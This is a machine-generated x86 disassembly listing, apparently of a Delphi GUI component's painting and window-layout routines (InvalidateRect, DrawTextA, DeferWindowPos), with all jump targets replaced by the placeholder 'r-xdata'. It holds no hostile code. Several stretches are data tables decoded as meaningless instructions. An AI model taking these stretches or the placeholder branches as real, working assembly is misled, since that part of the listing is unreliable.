mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4343c8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_44c874
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_451594
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4343cf
lea eax [ ebp - 0x14 ]
call sub_404038
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_4530b8
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_4530b8
push eax
call InvalidateRect
sub_4343d8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_434410
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_434572
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_43395c
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_4343d8
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_43395c
mov esi [ ebx + 0x208 ]
call sub_43d448
call sub_43d528
test al al
je r-xdata
push ebp
call sub_4343d8
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_43395c
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_424c70
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4250a4
mov eax ebx
call sub_4542b8
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_44eba4
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44c874
mov eax [ ebp - 0x1c ]
call sub_4044f8
push eax
mov eax esi
call sub_425570
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434579
lea eax [ ebp - 0x1c ]
call sub_404038
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_424d8c
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_42546c
mov edx r-xdata
mov eax esi
call sub_4253c8
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_434624
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f124
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_43467c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_451d4c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_43479d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_451d4c
call sub_403b20
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44c02c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_44c008
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_4347b8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_453c00
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_4347e4
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_4542c0
pop esi
pop ebx
retn
sub_434824
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec ecx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 2 ] bh
inc ebx
add [ eax + 0x49 ] dl
inc ebx
add [ edx + eax ] bl
add [ eax ] al
ror [ ebx ] 0x1
inc esp
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ edx + ecx * 2 ] cl
inc ebx
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
inc ecx
add [ eax + 0x1c0044e9 ] al
mov ebp 0xf0ac0044
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ esi + edx * 2 ] bl
inc esp
add ah ah
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_434988
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_44561c
mov edx edi
mov eax [ esi + 0x210 ]
call sub_418778
xor edx edx
mov eax edi
call sub_44c794
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_44c9e8
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_434db8
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_434a0c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_418a70
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44ef08
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_434a44
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_434aa9
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44591c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_434aae
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46d0dc
call sub_403af0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434ad4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_45209c
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_4034a4
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_434b14
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_451ee4
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_4034a4
pop edx
pop esi
pop ebx
retn
sub_434b40
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_441bd0
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_434df0
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_434bd0
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_434e64
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_4032a8
mov eax [ esi + 0x210 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_454ddc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_434c20
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_4244b8
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_434da9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_4530b8
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_44c794
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_44c278
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_4188d4
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_4034a4
test al al
je r-xdata
sub_434db8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_418930
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_44c480
mov eax ebx
mov si 0xffeb
call sub_4034a4
sub_434df0
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_434f68
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_434e64
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_434988
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_4189bc
call sub_4032a8
pop edi
pop esi
pop ebx
retn
sub_434ea4
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_434c20
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_434edc
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_4188d4
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_4188d4
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_434f68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_435031
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_434e64
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_434c20
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435038
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_4188d4
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_4188d4
pop edx
call sub_44c8a4
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_435040
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4525a4
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_4188d4
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_4350b4
push esi
dec ecx
add [ esi ] bl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
push esi
dec ecx
add [ 0x640000ff ] al
push esi
dec ecx
add [ esi ] al
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edi ] al
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edx ] cl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ ebx ] cl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edi + edi * 8 ] cl
add [ eax ] al
push esi
dec ecx
add [ 0x640000ff ] cl
push esi
dec ecx
add [ esi ] cl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edi ] cl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add al dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add cl dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dl dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bl dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ah dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ch dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dh dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bh dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add al bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add cl bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dl bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bl bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ah bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ch bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dh bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bh bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add al ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add cl ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dl ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bl ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ah ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ch ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dh ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bh ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add al ch
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add cl ch
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add dl ch
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add bl ch
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add ah ch
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add [ edx + edi + 0x52240049 ] bl
inc ebx
add [ edx + edi + 0x521c0049 ] dl
inc ebx
add [ edx + edi + 0x52140049 ] cl
inc ebx
add [ edx + edi + 0x520c0049 ] al
inc ebx
add [ edx + edi + 0x49 ] bh
add [ edx + edx * 2 ] al
inc ebx
add [ edx + edi + 0x49 ] dh
add ah bh
push ecx
inc ebx
add [ edx + edi + 0x49 ] ch
add ah dh
push ecx
inc ebx
add [ edx + edi + 0x49 ] ah
add ah ch
push ecx
inc ebx
add [ edx + edi + 0x49 ] bl
add ah ah
push ecx
inc ebx
add [ edx + edi + 0x49 ] dl
add ah bl
push ecx
inc ebx
add [ edx + edi + 0x49 ] cl
add ah dl
push ecx
inc ebx
add [ edx + edi + 0x49 ] al
add ah cl
push ecx
inc ebx
add [ edx + edi ] bh
dec ecx
add ah al
push ecx
inc ebx
add [ edx + edi ] dh
dec ecx
add [ ecx + edx * 2 + 0x3a2c0043 ] bh
dec ecx
add [ ecx + edx * 2 + 0x3a240043 ] dh
dec ecx
add [ ecx + edx * 2 + 0x3a1c0043 ] ch
dec ecx
add [ ecx + edx * 2 + 0x3a140043 ] ah
dec ecx
add [ ecx + edx * 2 + 0x3a0c0043 ] bl
dec ecx
add [ ecx + edx * 2 + 0x3a040043 ] dl
dec ecx
add [ ecx + edx * 2 + 0x39fc0043 ] cl
dec ecx
add [ ecx + edx * 2 + 0x39f40043 ] al
dec ecx
add [ ecx + edx * 2 + 0x43 ] bh
add ah ch
cmp [ ecx ] ecx
je r-xdata
add [ ecx + edi + 0x511c0049 ] dl
inc ebx
add [ ecx + edi + 0x51140049 ] cl
inc ebx
add [ ecx + edi + 0x510c0049 ] al
inc ebx
add [ ecx + edi + 0x49 ] bh
add [ ecx + edx * 2 ] al
inc ebx
add [ ecx + edi + 0x49 ] dh
add ah bh
push eax
inc ebx
add [ ecx + edi + 0x49 ] ch
add ah dh
push eax
inc ebx
add [ ecx + edi + 0x49 ] ah
add ah ch
push eax
inc ebx
add [ ecx + edi + 0x49 ] bl
add ah ah
push eax
inc ebx
add [ ecx + edi + 0x49 ] dl
add ah bl
push eax
inc ebx
add [ ecx + edi + 0x49 ] cl
add ah dl
push eax
inc ebx
add [ ecx + edi + 0x49 ] al
add ah cl
push eax
inc ebx
add [ ecx + edi ] bh
dec ecx
add ah al
push eax
inc ebx
add [ ecx + edi ] dh
dec ecx
add [ eax + edx * 2 + 0x392c0043 ] bh
dec ecx
add [ eax + edx * 2 - 0x74aaffbd ] dh
in al dx
xor eax eax
push ebp
push sub_4353e4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
inc ebx
add ah ah
cmp [ ecx ] ecx
insb
push ecx
inc ebx
add ah bl
cmp [ ecx ] ecx
push ecx
inc ebx
add ah dl
cmp [ ecx ] ecx
pop esp
push ecx
inc ebx
add ah cl
cmp [ ecx ] ecx
push esp
push ecx
inc ebx
add ah al
cmp [ ecx ] ecx
dec esp
push ecx
inc ebx
add [ ecx + edi + 0x51440049 ] bh
inc ebx
add [ ecx + edi + 0x513c0049 ] dh
inc ebx
add [ ecx + edi + 0x51340049 ] ch
inc ebx
add [ ecx + edi + 0x512c0049 ] ah
inc ebx
add [ ecx + edi + 0x51240049 ] bl
inc ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4353eb
retn
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_404aec
sub_435420
push esi
dec ecx
add ch ch
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_43544d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435454
retn
sub_435464
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcom [ ebx + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4354 0x0
adc [ eax ] al
add [ eax ] al
dec eax
popad
inc ecx
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ edx + ebx * 2 ] dh
inc ebx
add ah bh
push edi
